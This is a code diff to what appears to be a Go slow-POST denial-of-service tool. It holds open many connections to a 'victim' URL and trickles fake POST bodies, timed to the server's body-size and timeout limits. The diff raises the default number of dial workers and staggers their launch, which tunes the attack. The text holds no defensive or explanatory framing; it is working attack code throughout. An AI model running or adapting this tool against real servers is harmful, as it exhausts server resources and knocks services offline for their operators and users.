@@ -47,10 +47,10 @@ import (
 )
 
 var (
-	contentLength    = flag.Int("contentLength", 1000*1000, "The maximum length of fake body in bytes. Adjust to client_max_body_size")
-	dialWorkersCount = flag.Int("dialWorkersCount", 2, "The number of workers simultaneously busy with opening new TCP connections")
+	contentLength    = flag.Int("contentLength", 1000*1000, "The maximum length of fake POST body in bytes. Adjust to client_max_body_size")
+	dialWorkersCount = flag.Int("dialWorkersCount", 10, "The number of workers simultaneously busy with opening new TCP connections")
 	goMaxProcs       = flag.Int("goMaxProcs", runtime.NumCPU(), "The maximum number of CPUs to use. Don't touch :)")
-	rampUpInterval   = flag.Duration("rampUpInterval", 100*time.Millisecond, "Interval between new connections' acquisitions for a single dial workers (see dialWorkersCount)")
+	rampUpInterval   = flag.Duration("rampUpInterval", time.Second, "Interval between new connections' acquisitions for a single dial workers (see dialWorkersCount)")
 	sleepInterval    = flag.Duration("sleepInterval", 50*time.Second, "Sleep interval between subsequent packets sending. Adjust to client_body_timeout")
 	testDuration     = flag.Duration("testDuration", time.Hour, "Test duration")
 	victimUrl        = flag.String("victimUrl", "http://127.0.0.1/", "Victim's url (must support http POST)")
@@ -85,10 +85,12 @@ func main() {
 	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
 		victimUri.RequestURI(), victimUri.Host, *contentLength))
 
+	dialWorkersLaunchInterval := *rampUpInterval / time.Duration(*dialWorkersCount)
 	activeConnectionsCh := make(chan int, 10)
 	go activeConnectionsCounter(activeConnectionsCh)
 	for i := 0; i < *dialWorkersCount; i++ {
 		go dialWorker(activeConnectionsCh, victimHostPort, victimUri, requestHeader)
+		time.Sleep(dialWorkersLaunchInterval)
 	}
 	time.Sleep(*testDuration)
 }
